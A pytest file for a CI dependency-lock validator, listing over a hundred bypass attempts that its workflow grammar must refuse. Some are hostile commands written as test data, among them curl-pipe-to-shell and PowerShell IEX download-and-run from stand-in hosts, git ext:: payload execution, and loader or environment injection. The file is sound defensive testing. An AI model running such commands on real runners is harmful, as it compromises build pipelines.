"""Every Python install the workflows and the operator run resolves from uv.lock.

Before this, only the Windows CI job used the lockfile; the Linux jobs, the
release gates and the published install instructions resolved ``pyproject.toml``
version ranges at run time, so what CI tested, what the release built and what
an operator installed could each be a different set of dependency versions.

The rule is enforced by ``tests/workflow_grammar.py``: it parses each workflow,
splits every ``run:`` into commands, and accepts a command only if it equals an
entry of a closed table of reviewed templates (environment, redirections, the
facts a command needs from earlier in its job, npm scripts and PowerShell steps
likewise). Its docstring says what it does not establish. The negative cases
below are the bypasses reviewers found against the substring scanner it
replaced and against three earlier grammars that parsed program options, plus
the obvious neighbours; each must be refused, and the positive controls show
the refusals are for the command, not the template around it.
"""

from __future__ import annotations

import json
import re
import tomllib
from pathlib import Path
from typing import Any

import pytest
import workflow_grammar
from workflow_grammar import (
    PWSH_BODIES,
    TEMPLATES,
    configuration_violations,
    script_violations,
    split_commands,
    workflow_violations,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
SMOKE = REPO_ROOT / "scripts" / "installed_package_smoke.sh"
QUICKSTART = REPO_ROOT / "docs" / "windows-quickstart.md"
# Both suffixes: GitHub runs either, and a .yaml file nobody scans is a bypass (Sol r2).
WORKFLOW_FILES = sorted([*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")])


def _job_block(text: str, job: str) -> str:
    match = re.search(rf"^  {re.escape(job)}:\n(?P<body>(?:^(?:    .*|\s*)\n)*)", text, re.M)
    assert match is not None, f"job {job!r} not found"
    return match["body"]


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda path: path.name)
def test_every_workflow_command_is_in_the_grammar(path: Path) -> None:
    assert workflow_violations(path) == []


def test_the_smoke_script_is_in_the_grammar() -> None:
    assert script_violations(SMOKE) == []


def test_the_grammar_sees_the_commands_that_matter() -> None:
    """The control: a lexer that found nothing would pass every file above."""
    text = (WORKFLOWS / "release.yml").read_text(encoding="utf-8")
    assert "uv sync --locked --extra dev" in text
    seen = {" ".join(command.words[:3]) for command in split_commands(SMOKE.read_text())}
    assert "$TMPDIR/venv/bin/pip install --require-hashes" in seen
    assert "uv build --wheel" in seen


_STEP = """name: probe
on: push
jobs:
  probe:
    runs-on: ubuntu-latest
    {env}
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
{steps}
"""

UNLOCKED_VARIANTS = {
    # Sol B2 / DeepSeek N3, verbatim shapes.
    "env_indirection": ("env: {PIP_COMMAND: pip}", "      - run: $PIP_COMMAND install requests"),
    "folded_scalar": ("", "      - run: >-\n          python -m pip\n          install requests"),
    "composite_action": ("", "      - uses: ./.github/actions/unlocked"),
    "same_line_comment_flags": (
        "",
        "      - run: uv sync --locked --extra dev; python -m pip install requests"
        " # --no-deps --no-index",
    ),
    "uv_pip_comment_flags": (
        "",
        "      - run: uv sync --locked --extra dev; uv pip install requests"
        " # --require-hashes -r ignored",
    ),
    "uv_pip_sync": ("", "      - run: uv pip sync requirements.txt"),
    "expression_command": (
        "env: {INSTALL_CMD: pip install x}",
        "      - run: ${{ env.INSTALL_CMD }}",
    ),
    # Neighbours.
    "anchor_alias": (
        "",
        "      - &unlocked\n        run: >-\n          python -m pip\n          install requests\n"
        "      - *unlocked",
    ),
    "uvx": ("", "      - run: uvx ruff check ."),
    "uv_tool": ("", "      - run: uv tool install ruff"),
    "uv_build_unlocked": ("", "      - run: uv build --wheel --out-dir dist"),
    "uv_sync_unlocked": ("", "      - run: uv sync --extra dev"),
    "uv_run_unlocked": ("", "      - run: uv run pytest"),
    "uv_run_pip": ("", "      - run: uv run --locked pip install requests"),
    "uv_export_with_dev": (
        "",
        "      - run: uv export --locked --extra dev --no-emit-project --format requirements.txt"
        " --output-file r.txt",
    ),
    "pip_hashes_plus_package": ("", "      - run: pip install --require-hashes -r r.txt requests"),
    "pip_no_deps_not_artifact": ("", "      - run: pip install --no-deps --no-index requests"),
    "pip_editable": ("", "      - run: pip install -e '.[dev]'"),
    "venv_pip_path": ("", "      - run: /tmp/v/bin/pip install requests"),
    "variable_pip_path": ("", """      - run: '"$VENV/bin/pip" install requests'"""),
    "isolated_build": ("", "      - run: python -m build --wheel"),
    "pipx": ("", "      - run: pipx install ruff"),
    "eval": ("", '      - run: eval "pip install requests"'),
    "bash_c": ("", "      - run: bash -c 'pip install requests'"),
    "sh_c": ("", "      - run: sh -c 'pip install requests'"),
    "backticks": ("", "      - run: echo `pip install requests`"),
    "substitution": ("", "      - run: echo $(pip install requests)"),
    "heredoc_installer": (
        "",
        "      - run: |\n          python - <<'PY'\n          import subprocess\n"
        "          subprocess.run(['pip', 'install', 'requests'])\n          PY",
    ),
    "npm_install": ("", "      - run: npm install left-pad"),
    "curl_remote": ("", "      - run: curl -sSf https://example.invalid/install.sh -o i.sh"),
    "unknown_program": ("", "      - run: poetry install"),
    "pwsh_unpinned_module": (
        "",
        "      - shell: pwsh\n        run: Install-Module PSScriptAnalyzer -Force",
    ),
    "unpinned_action": ("", "      - uses: astral-sh/setup-uv@v7"),
    # Round 2 (Sol B2/new B1, DeepSeek BLOCK-1/N6), verbatim where the report gave the string.
    "command_builtin": ("", "      - run: command pip install requests"),
    "command_dashdash_pip": ("", "      - run: command -- pip install requests"),
    "command_path_pip": ("", "      - run: command /usr/bin/pip install requests"),
    "python_c_subprocess": (
        "",
        '      - run: >-\n          python -c "import subprocess; subprocess.run('
        "['pip','install','requests'], check=True)\"",
    ),
    "python_c_pip": (
        "",
        "      - run: python -c 'import os; os.system(\"pip install requests\")'",
    ),
    "python3_c_pip": (
        "",
        "      - run: python3 -c 'import os; os.system(\"pip install requests\")'",
    ),
    "python_c_plain": ("", "      - run: python -c 'print(1)'"),
    "uv_run_python_c": (
        "",
        "      - run: uv run --locked python -c 'import os; os.system(\"pip install x\")'",
    ),
    "python_heredoc_obfuscated": (
        "",
        "      - run: |\n          python - <<'PY'\n          import subprocess\n"
        "          subprocess.run(['pi'+'p','install','x'])\n          PY",
    ),
    "python_dash_reads_file": ("", "      - run: python - < script.py"),
    "uv_run_python_dash": ("", "      - run: uv run --locked python - < script.py"),
    "python_stdin_pipe": ("", "      - run: echo 'import os' | python"),
    "npm_script_unknown": ("", "      - run: npm run install-unlocked"),
    "arbitrary_hashed_requirements": (
        "",
        "      - run: |\n          cat > rogue.txt <<'EOF'\n"
        "          six==1.17.0 --hash=sha256:deadbeef\n          EOF\n"
        "          pip install --require-hashes -r rogue.txt",
    ),
    "hashed_requirements_not_exported": (
        "",
        "      - run: |\n          printf 'six==1.17.0 --hash=sha256:00\\n' > rogue.txt\n"
        "          pip install --require-hashes -r rogue.txt",
    ),
    "hashed_requirements_url": (
        "",
        "      - run: pip install --require-hashes -r https://example.invalid/r.txt",
    ),
    "exported_requirements_overwritten": (
        "",
        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
        " --format requirements.txt --output-file r.txt\n"
        "          cp rogue.txt r.txt\n          pip install --require-hashes -r r.txt",
    ),
    "unscanned_reusable_yaml": (
        "",
        "      - run: echo placeholder\n  delegated:\n    uses: ./.github/workflows/unscanned.yaml",
    ),
    "setup_python_cache": (
        "",
        "      - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1\n"
        "        with:\n          python-version: '3.13'\n          cache: pip\n"
        "          cache-dependency-path: requirements-unlocked.txt",
    ),
    "setup_python_pip_install_input": (
        "",
        "      - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1\n"
        "        with:\n          python-version: '3.13'\n"
        "          pip-install: requirements-unlocked.txt",
    ),
    # The round-2 brief's shapes, each confirmed refused.
    "python3_m_pip": ("", "      - run: python3 -m pip install requests"),
    "uv_tool_install": ("", "      - run: uv tool install ruff"),
    "uv_add": ("", "      - run: uv add requests"),
    "pip_download": ("", "      - run: pip download requests"),
    "curl_pipe_sh": ("", "      - run: curl -sSf https://example.invalid/i.sh | sh"),
    "curl_pipe_bash": ("", "      - run: curl -sSf https://example.invalid/i.sh | bash"),
    "npx_arbitrary": ("", "      - run: npx cowsay hello"),
    "npx_yes_playwright": ("", "      - run: npx --yes playwright install"),
    "bash_c_double": ("", '      - run: bash -c "pip install requests"'),
    "bash_heredoc": (
        "",
        "      - run: |\n          bash <<'EOF'\n          pip install requests\n          EOF",
    ),
    "here_string": ("", "      - run: bash <<< 'pip install requests'"),
    "literal_block_continuation": (
        "",
        "      - run: |\n          echo before\n          python3 -m pip \\\n"
        "            install \\\n            requests",
    ),
    "matrix_program": (
        "strategy: {matrix: {cmd: ['pip install requests']}}",
        "      - run: ${{ matrix.cmd }} --quiet",
    ),
    "matrix_via_env": (
        "strategy: {matrix: {cmd: ['pip']}}",
        "      - env: {INSTALLER: '${{ matrix.cmd }}'}\n        run: $INSTALLER install requests",
    ),
    # Prefixes that run their arguments.
    "builtin": ("", "      - run: builtin command pip install requests"),
    "exec": ("", "      - run: exec pip install requests"),
    "env_prefix": ("", "      - run: env pip install requests"),
    "nohup": ("", "      - run: nohup pip install requests"),
    "time": ("", "      - run: time pip install requests"),
    "timeout": ("", "      - run: timeout 60 pip install requests"),
    "sudo": ("", "      - run: sudo pip install requests"),
    "source": ("", "      - run: source ./env.sh"),
    "dot": ("", "      - run: . ./env.sh"),
    "trap_body": ("", "      - run: trap 'pip install requests' EXIT"),
    "find_exec": ("", "      - run: find . -name x -exec pip install requests \\;"),
    "git_alias": ("", "      - run: git -c alias.x='!pip install requests' x"),
    "gh_extension": ("", "      - run: gh extension install owner/gh-x"),
    "tar_to_command": ("", "      - run: tar --to-command='pip install requests' -xf a.tar"),
    "mapfile_callback": ("", "      - run: mapfile -C 'pip install requests' -c 1 LINES < f"),
    # Shell constructs that hide a command.
    "parameter_default_substitution": ("", "      - run: echo ${X:-$(pip install requests)}"),
    "array_substitution": ("", "      - run: FLAGS=($(pip install requests))"),
    "python_variable_in_workflow": (
        "env: {PY: python}",
        "      - run: PYTHON=pip; $PYTHON install requests",
    ),
    # Programs only where they come from a lock.
    "pytest_outside_uv_run": ("", "      - run: pytest -q"),
    "node_tool_outside_npm": ("", "      - run: prettier --check ."),
    "mypy_install_types": ("", "      - run: uv run --locked mypy --install-types src"),
    "pip_audit_resolving": (
        "",
        "      - run: uv run --locked --only-group release pip-audit -r requirements.txt",
    ),
    "npm_audit_fix": ("", "      - run: npm audit fix"),
    "npm_install_dev": ("", "      - run: npm ci --include=dev --foreground-scripts"),
    "npm_run_extra_args": ("", "      - run: npm run check -- --fix"),
    "python_option": ("", "      - run: python -I scripts/check_safety.py"),
    "python_unknown_script": ("", "      - run: python scripts/not_checked_in.py"),
    "python_script_escape": ("", "      - run: python scripts/../../outside.py"),
    "venv_upgrade_deps": ("", "      - run: python -m venv /tmp/v --upgrade-deps"),
    # Writes that turn into an install or a different program.
    "write_into_scripts": ("", "      - run: echo 'import os' > scripts/check_safety.py"),
    "write_pth": ("", "      - run: echo 'import os' > /tmp/v/lib/python3.13/site-packages/x.pth"),
    "write_pip_conf": ("", "      - run: echo '[global]' > pip.conf"),
    "write_github_path": ("", '      - run: echo "$PWD/bin" >> "$GITHUB_PATH"'),
    "write_github_env": ("", '      - run: echo "PIP_INDEX_URL=x" >> $GITHUB_ENV'),
    "write_venv_bin": ("", "      - run: cp evil /tmp/smoke-venv/bin/gpo-studio"),
    # Environment that redirects an installer or the shell.
    "path_assignment": ("", "      - run: PATH=./bin:$PATH pip check"),
    "export_path": ("", "      - run: export PATH=./bin:$PATH"),
    "pip_env_inline": ("", "      - run: PIP_REQUIREMENT=r.txt pip check"),
    "bash_env_yaml": ("env: {BASH_ENV: ./evil.sh}", "      - run: echo hi"),
    "uv_env_yaml": ("env: {UV_INDEX_URL: https://example.invalid}", "      - run: echo hi"),
    "env_program_variable": ("env: {INSTALLER: pip}", "      - run: $INSTALLER install requests"),
    # Workflow structure the grammar cannot see into.
    "unknown_action": (
        "",
        "      - uses: example/install-anything@0123456789abcdef0123456789abcdef01234567",
    ),
    "shell_python": ("", "      - shell: python\n        run: print(1)"),
    "working_directory": ("", "      - working-directory: /tmp\n        run: echo hi"),
    "default_shell": ("defaults: {run: {shell: 'python {0}'}}", "      - run: echo hi"),
    "job_container": ("container: python:3", "      - run: echo hi"),
    "missing_reusable_yml": (
        "",
        "      - run: echo placeholder\n  delegated:\n    uses: ./.github/workflows/nope.yml",
    ),
    "smoke_script_rogue_requirements": (
        "",
        "      - run: GPO_STUDIO_REQUIREMENTS=rogue.txt bash scripts/installed_package_smoke.sh",
    ),
    "smoke_script_hand_off_via_uv_run": (
        "",
        "      - run: GPO_STUDIO_REQUIREMENTS=rogue.txt uv run --locked"
        " bash scripts/installed_package_smoke.sh",
    ),
    "smoke_script_hand_off_exported": (
        "",
        "      - run: |\n          export GPO_STUDIO_REQUIREMENTS=rogue.txt\n"
        "          bash scripts/installed_package_smoke.sh",
    ),
    "set_allexport": (
        "",
        "      - run: |\n          set -a\n          GPO_STUDIO_REQUIREMENTS=rogue.txt\n"
        "          bash scripts/installed_package_smoke.sh",
    ),
    "relative_program_path": (
        "",
        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
        " --format requirements.txt --output-file r.txt\n"
        "          ./pip install --require-hashes -r r.txt",
    ),
    "curl_userinfo_host": ("", "      - run: curl -sf http://127.0.0.1:80@example.invalid/i.sh"),
    "curl_second_operand": (
        "",
        "      - run: curl -sf http://127.0.0.1:8799/ example.invalid/i.sh -o i.txt",
    ),
    "curl_config_file": ("", "      - run: curl -sf -K remote.cfg http://127.0.0.1:8799/"),
    "git_output_file": ("", "      - run: git log --output=scripts/check_safety.py"),
    "git_env": ("", "      - run: GIT_EXTERNAL_DIFF=./x git diff"),
    "smoke_script_python_override": (
        "",
        "      - run: PYTHON='pip install requests;' bash scripts/installed_package_smoke.sh",
    ),
    # Round 3 (Sol B1-B4, DeepSeek BLOCK-1..3 and its non-blocking probes), verbatim.
    "npx_playwright_without_npm_ci": (
        "",
        "      - run: npx playwright install --with-deps chromium",
    ),
    "npx_package_flag": ("", "      - run: npx --package cowsay playwright install"),
    "npx_extra_flag": ("", "      - run: npx playwright install --yes chromium"),
    "npx_playwright_extra_pkg": ("", "      - run: npx playwright install cowsay"),
    "npx_playwright_install_deps": ("", "      - run: npx playwright install-deps chromium"),
    "smoke_attacker_python": (
        "",
        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
        " --format requirements.txt --output-file r.txt\n"
        "          PYTHON=./attacker/python GPO_STUDIO_REQUIREMENTS=r.txt"
        " bash scripts/installed_package_smoke.sh",
    ),
    "smoke_attacker_wheel": (
        "",
        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
        " --format requirements.txt --output-file r.txt\n"
        "          GPO_STUDIO_WHEEL=attacker.whl GPO_STUDIO_REQUIREMENTS=r.txt"
        " bash scripts/installed_package_smoke.sh",
    ),
    "smoke_attacker_requirements": (
        "",
        "      - run: GPO_STUDIO_REQUIREMENTS=attacker.txt bash scripts/installed_package_smoke.sh",
    ),
    "smoke_evil_wheel_abs": (
        "",
        "      - run: GPO_STUDIO_WHEEL=/tmp/evil.whl bash scripts/installed_package_smoke.sh",
    ),
    "smoke_evil_wheel_traversal": (
        "",
        "      - run: GPO_STUDIO_WHEEL=../../evil.whl bash scripts/installed_package_smoke.sh",
    ),
    "smoke_evil_python_abs": (
        "",
        "      - run: PYTHON=/tmp/evil/python bash scripts/installed_package_smoke.sh",
    ),
    "smoke_evil_python_rel": (
        "",
        "      - run: PYTHON=../evil/python bash scripts/installed_package_smoke.sh",
    ),
    "smoke_python_with_dollar": (
        "",
        """      - run: 'PYTHON="$HOME/v/bin/python" bash scripts/installed_package_smoke.sh'""",
    ),
    "pwsh_mixed_case_python": (
        "",
        "      - shell: pwsh\n        run: PyThOn -m PiP install requests",
    ),
    "pwsh_lowercase_module": ("", "      - shell: pwsh\n        run: install-module Pester -Force"),
    "pwsh_arbitrary_pinned_module": (
        "",
        "      - shell: pwsh\n"
        "        run: Install-Module AttackerPackage -RequiredVersion 1.2.3 -Force",
    ),
    "pwsh_psresource": ("", "      - shell: pwsh\n        run: Install-PSResource Pester"),
    "pwsh_start_process": (
        "",
        "      - shell: pwsh\n"
        "        run: Start-Process pip -ArgumentList 'install','requests' -Wait",
    ),
    "pwsh_upper_pip": ("", "      - shell: pwsh\n        run: PIP install x"),
    "pwsh_mixed_pip": ("", "      - shell: pwsh\n        run: Pip install x"),
    "pwsh_upper_python": ("", "      - shell: pwsh\n        run: PYTHON -c 'x'"),
    "pwsh_upper_iex": (
        "",
        "      - shell: pwsh\n"
        "        run: IEX (New-Object Net.WebClient).DownloadString('http://x')",
    ),
    "pwsh_mixed_iex": (
        "",
        "      - shell: pwsh\n"
        "        run: Iex (New-Object Net.WebClient).DownloadString('http://x')",
    ),
    "pwsh_upper_invoke_expression": (
        "",
        "      - shell: pwsh\n        run: INVOKE-EXPRESSION 'pip install x'",
    ),
    "pwsh_install_module_upper": (
        "",
        "      - shell: pwsh\n        run: INSTALL-MODULE Foo -Force",
    ),
    "pwsh_pinned_module": (
        "",
        "      - shell: pwsh\n        run: Install-Module Foo -RequiredVersion 1.0.0 -Force",
    ),
    "pwsh_cmd_comspec": ("", "      - shell: pwsh\n        run: cmd /c 'python -m pip install x'"),
    "pwsh_dotnet_tool": ("", "      - shell: pwsh\n        run: dotnet tool install -g x"),
    "pwsh_bootstrap_plus_install": (
        "",
        "      - shell: pwsh\n        run: |\n"
        "          Set-PSRepository PSGallery -InstallationPolicy Trusted\n"
        "          Install-Module PSScriptAnalyzer -RequiredVersion 1.25.0 -Scope CurrentUser"
        " -Force\n          Install-Module Pester -RequiredVersion 5.0.0 -Force",
    ),
    "windows_default_shell_install": (
        "",
        "      - run: uv sync --locked --extra dev\n  win:\n    runs-on: windows-latest\n"
        "    steps:\n      - run: PIP install requests",
    ),
    "local_composite_action": ("", "      - uses: ./.github/actions/install/action.yml"),
    "printf_retargets_requirements": (
        "",
        "      - run: |\n          LOCKED=good\n"
        "          uv export --locked --no-default-groups --no-emit-project"
        ' --format requirements.txt --output-file "$LOCKED/r.txt"\n'
        "          printf -v LOCKED attacker\n"
        '          pip install --require-hashes -r "$LOCKED/r.txt"',
    ),
    "printf_overrides_path": (
        "",
        "      - run: |\n          printf -v PATH './attacker:%s' \"$PATH\"\n          pip check",
    ),
    "cp_long_target_into_venv_bin": (
        "",
        "      - run: |\n          python -m venv /tmp/v\n"
        "          cp --target-directory=/tmp/v/bin attacker/pip\n          /tmp/v/bin/pip check",
    ),
    "git_ext_transport_config": (
        "",
        "      - run: |\n          printf 'pip install requests\\n' > /tmp/p\n"
        '          printf \'[protocol "ext"]\\n\\tallow = always\\n[remote "origin"]\\n'
        "\\turl = ext::sh /tmp/p\\n\\tfetch = +refs/heads/*:refs/remotes/origin/*\\n'"
        " > .git/config\n          git fetch origin",
    ),
    "git_global_config_ext": (
        "",
        "      - run: |\n"
        "          printf '[protocol \"ext\"]\\n\\tallow = always\\n' > $HOME/.gitconfig\n"
        "          git fetch 'ext::sh /tmp/payload'",
    ),
    "git_fetch_allowed_after_config_write": (
        "",
        "      - run: |\n          printf '[protocol \"ext\"]\\n\\tallow = always\\n'"
        " > .git/config\n          git fetch --no-tags origin main",
    ),
    "curl_home": ("", "      - run: CURL_HOME=/tmp/evil curl -sf http://127.0.0.1:8799/"),
    "curlrc_write": (
        "",
        "      - run: |\n          printf 'url = file:///etc/hostname\\n' > /tmp/evil/.curlrc\n"
        "          curl -sf http://127.0.0.1:8799/",
    ),
    "curl_home_yaml_env": ("env: {CURL_HOME: /tmp/evil}", "      - run: echo hi"),
    "write_so": ("", "      - run: printf 'x' > /tmp/evil.so"),
    "write_whl": ("", "      - run: printf 'x' > /tmp/evil.whl"),
    "write_tmp_python": ("", "      - run: printf '#!/bin/sh' > /tmp/evil/python"),
    "write_git_config": ("", "      - run: echo x > .git/config"),
    "cp_system_python": ("", "      - run: cp /usr/bin/python3 /tmp/evil/python"),
    "redirect_over_python": ("", "      - run: echo x > /tmp/evil/python"),
    "chmod_after": (
        "",
        "      - run: |\n          cp /bin/sh /tmp/evil/sh\n          chmod +x /tmp/evil/sh",
    ),
    "script_output_written": (
        "",
        "      - run: uv run --locked python scripts/check_safety.py > /tmp/evil/python",
    ),
    "install_cmd": ("", "      - run: install -m 755 /bin/sh /tmp/evil/python"),
    "busybox": ("", "      - run: busybox sh -c 'pip install x'"),
    "node_path_env": ("env: {NODE_PATH: /tmp/evil}", "      - run: echo hi"),
    "ld_audit_env": ("env: {LD_AUDIT: /tmp/evil.so}", "      - run: echo hi"),
    "gh_config_dir_env": ("env: {GH_CONFIG_DIR: /tmp/evil}", "      - run: echo hi"),
    "dotnet_cli_home_env": ("env: {DOTNET_CLI_HOME: /tmp/evil}", "      - run: echo hi"),
    "cargo_home_env": ("env: {CARGO_HOME: /tmp/evil}", "      - run: echo hi"),
    "npm_token_env": ("env: {NPM_TOKEN: x}", "      - run: echo hi"),
    "pip_foo_env": ("env: {PIP_FOO: x}", "      - run: echo hi"),
    "xdg_config_home_env": ("env: {XDG_CONFIG_HOME: /tmp/evil}", "      - run: echo hi"),
    "home_env": ("env: {HOME: /tmp/evil}", "      - run: echo hi"),
    "allowed_name_other_value": ("env: {SOURCE_DATE_EPOCH: '0'}", "      - run: echo hi"),
    "tar_options_inline": ("", "      - run: TAR_OPTIONS=--to-command=sh tar tzf x.tar.gz"),
    "node_path_inline": ("", "      - run: NODE_PATH=/tmp/evil npm run check"),
    "harmless_inline": ("", "      - run: FOO=bar python scripts/check_safety.py"),
    "npm_exec": ("", "      - run: npm exec -- pip install x"),
    "npm_publish": ("", "      - run: npm publish"),
    "npm_test_alias": ("", "      - run: |\n          npm ci\n          npm test"),
    "npm_run_format_writes_sources": (
        "",
        "      - run: |\n          npm ci\n          npm run format",
    ),
    "uv_lock_write": ("", "      - run: uv lock"),
    "uv_run_npx": ("", "      - run: uv run --locked npx playwright install"),
    "uv_run_group_other": ("", "      - run: uv run --locked --group foo python -c '1'"),
    "uv_run_pip_locked_file": (
        "",
        "      - run: uv run --locked pip install --require-hashes -r x.txt",
    ),
    "process_substitution_python": ("", "      - run: python <(printf 'import os')"),
    "process_substitution_bash": ("", "      - run: bash <(printf 'pip install x')"),
    "function_definition": ("", "      - run: 'f() { pip install x; }; f'"),
    "case_arm": (
        "",
        "      - run: |\n          case $x in\n            a) pip install requests ;;\n"
        "            *) echo ok ;;\n          esac",
    ),
    "for_loop_retargets_variable": (
        "",
        "      - run: |\n          for LOCKED in attacker; do\n"
        '            /tmp/smoke-venv/bin/pip install --require-hashes -r "$LOCKED/r.txt"\n'
        "          done",
    ),
    "echo_option": ("", "      - run: echo -e '\\x70ip'"),
    "unlisted_venv": (
        "",
        "      - run: |\n          python -m venv /tmp/evil-venv\n"
        "          /tmp/evil-venv/bin/pip check",
    ),
    "venv_used_before_created": ("", "      - run: /tmp/smoke-venv/bin/pip check"),
    "wheel_without_build": (
        "",
        "      - run: |\n          python -I -m venv /tmp/smoke-venv\n"
        "          /tmp/smoke-venv/bin/pip install --no-deps --no-index dist/gpo_studio-*.whl",
    ),
    "input_redirect": (
        "",
        "      - run: uv run --locked python scripts/check_safety.py < /tmp/evil",
    ),
    "export_any": ("", "      - run: export FOO=bar"),
    "runner_expression": (
        "",
        "      - run: uv sync --locked --extra dev\n  matrix-os:\n"
        "    runs-on: ${{ matrix.os }}\n    steps:\n      - run: uv sync --locked --extra dev",
    ),
    "runner_self_hosted_windows": (
        "",
        "      - run: uv sync --locked --extra dev\n  labelled:\n"
        "    runs-on: [self-hosted, win]\n    steps:\n      - run: uv sync --locked --extra dev",
    ),
}

# Build, export and hand over a wheel exactly as release.yml does.
_HAND_OFF = (
    "      - run: uv run --locked --only-group release python -I -m build --no-isolation"
    " --outdir dist\n"
    "      - run: uv export --locked --no-default-groups --no-emit-project"
    " --format requirements.txt --output-file requirements-lock.txt\n"
    "      - run: |\n"
    "          WHEEL=$(find dist -maxdepth 1 -name 'gpo_studio-*.whl' -print -quit)\n"
    '          PYTHON=python GPO_STUDIO_WHEEL="$WHEEL"'
    " GPO_STUDIO_REQUIREMENTS=requirements-lock.txt bash scripts/installed_package_smoke.sh"
)


@pytest.mark.parametrize("name", sorted(UNLOCKED_VARIANTS))
def test_an_unlocked_or_unreadable_command_is_refused(name: str, tmp_path: Path) -> None:
    env, steps = UNLOCKED_VARIANTS[name]
    workflow = tmp_path / "probe.yml"
    workflow.write_text(_STEP.format(env=env, steps=steps), encoding="utf-8")
    assert workflow_violations(workflow), f"{name} was accepted"


def test_the_negative_template_itself_is_accepted(tmp_path: Path) -> None:
    """Without this, every variant above could fail for a reason unrelated to its command."""
    workflow = tmp_path / "probe.yml"
    workflow.write_text(
        _STEP.format(env="", steps="      - run: uv sync --locked --extra dev"), encoding="utf-8"
    )
    assert workflow_violations(workflow) == []


def _verdict(tmp_path: Path, steps: str, *, env: str = "") -> list[str]:
    workflow = tmp_path / "probe.yml"
    workflow.write_text(_STEP.format(env=env, steps=steps), encoding="utf-8")
    return workflow_violations(workflow)


def test_every_template_is_reviewed_and_used_by_a_real_command(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The table is derived from what the workflows run: an unused entry is an allowance."""
    used: set[workflow_grammar.Template] = set()
    original = workflow_grammar._match

    def recording(template: workflow_grammar.Template, tokens: tuple[str, ...]) -> Any:
        found = original(template, tokens)
        if found is not None:
            used.add(template)
        return found

    monkeypatch.setattr(workflow_grammar, "_match", recording)
    for path in WORKFLOW_FILES:
        workflow_violations(path)
    script_violations(SMOKE)
    unused = [" ".join(template.tokens) for template in TEMPLATES if template not in used]
    assert unused == []
    assert all(template.why.strip() for template in TEMPLATES)
    assert len(set(TEMPLATES)) == len(TEMPLATES)


def test_locked_playwright_needs_npm_ci_in_the_same_job(tmp_path: Path) -> None:
    """Sol r3 B4: without the lock installed, npx fetches playwright from the registry."""
    install = "      - run: node_modules/.bin/playwright install --with-deps chromium firefox"
    (problem,) = _verdict(tmp_path, install)
    assert "npm-ci" in problem
    assert _verdict(tmp_path, f"      - run: npm ci\n{install}") == []


def test_exported_requirements_do_not_cross_jobs(tmp_path: Path) -> None:
    """Sol r3 B5: jobs are separate machines; a producer job's export is not the consumer's."""
    export = (
        "uv export --locked --no-default-groups --no-emit-project --format requirements.txt"
        " --output-file requirements-lock.txt"
    )
    install = (
        "python -I -m venv /tmp/wheel-venv\n"
        "          /tmp/wheel-venv/bin/pip install --require-hashes -r requirements-lock.txt"
    )
    cross = (
        f"      - run: {export}\n  consumer:\n    runs-on: ubuntu-latest\n    steps:\n"
        f"      - run: |\n          {install}"
    )
    (problem,) = _verdict(tmp_path, cross)
    assert "lock:requirements-lock.txt" in problem
    assert _verdict(tmp_path, f"      - run: {export}\n      - run: |\n          {install}") == []


def test_the_smoke_script_hand_off_is_this_jobs_wheel_and_lock(tmp_path: Path) -> None:
    """Sol r3 B2: PYTHON is `python`, the wheel is the one built here, the lock exported here."""
    assert _verdict(tmp_path, _HAND_OFF) == []
    without_build = _HAND_OFF.split("\n", 1)[1]
    assert _verdict(tmp_path, without_build)
    for changed in ("PYTHON=python3", 'GPO_STUDIO_WHEEL="dist/x.whl"', "=requirements.txt"):
        original = {
            "PYTHON=python3": "PYTHON=python",
            "=requirements.txt": "=requirements-lock.txt",
        }
        old = original.get(changed, 'GPO_STUDIO_WHEEL="$WHEEL"')
        assert _verdict(tmp_path, _HAND_OFF.replace(old, changed, 1)), changed


def _pwsh_step(body: str) -> str:
    indented = "\n".join(f"          {line}" for line in body.splitlines())
    return f"      - shell: pwsh\n        run: |\n{indented}"


def test_powershell_bodies_match_exactly(tmp_path: Path) -> None:
    """Exact, so no case or spacing variant of anything is accepted (Sol r4 N1)."""
    fetch = next(iter(PWSH_BODIES))
    assert _verdict(tmp_path, _pwsh_step(fetch)) == []
    assert _verdict(tmp_path, _pwsh_step(fetch.upper()))
    # Sol r4 probe pwsh_joined_statements: one statement where the reviewed body has two.
    assert _verdict(tmp_path, _pwsh_step(" ".join(fetch.splitlines())))


def test_no_reviewed_powershell_body_installs_a_module() -> None:
    """Sol r4 B4: PSScriptAnalyzer is pinned by its package's SHA-256, never installed."""
    for body in PWSH_BODIES:
        lowered = body.lower()
        for installer in ("install-module", "install-psresource", "install-package", "iex"):
            assert installer not in lowered.split(), (installer, body)
        assert "install-module" not in lowered and "set-psrepository" not in lowered
    (fetch,) = [body for body in PWSH_BODIES if "Invoke-WebRequest" in body]
    assert "'14E634C828EB98EFB9F40B2918BA90F139ED5ECCDF663A2A747736D996995D60'" in fetch
    assert fetch.index("Get-FileHash") < fetch.index("Expand-Archive")
    assert "throw" in fetch
    ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
    analyzer = ci.split("- name: PSScriptAnalyzer\n", 1)[1]
    assert "Import-Module (Join-Path $env:RUNNER_TEMP 'psscriptanalyzer/module/" in analyzer


# Sol r4 B1: the reviewed spelling only. Quotes and escapes change what a word means.
def _spellings(token: str) -> set[str]:
    prefix, value = "", token
    match = re.match(r"^[A-Za-z_][A-Za-z0-9_]*\+?=", token)
    if match:
        prefix, value = token[: match.end()], token[match.end() :]
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
        inner = value[1:-1]
    else:
        inner = value
    escaped = inner.replace("$", "\\$")
    variants = {inner, f"'{inner}'", f'"{inner}"', f"$'{inner}'", escaped, f'"{escaped}"'}
    return {prefix + variant for variant in variants} - {token}


def _variable_bearing() -> list[tuple[workflow_grammar.Template, int]]:
    return [
        (template, index)
        for template in TEMPLATES
        for index, token in enumerate(template.tokens)
        if "$" in token
    ]


class _EverythingHolds(workflow_grammar.Context):
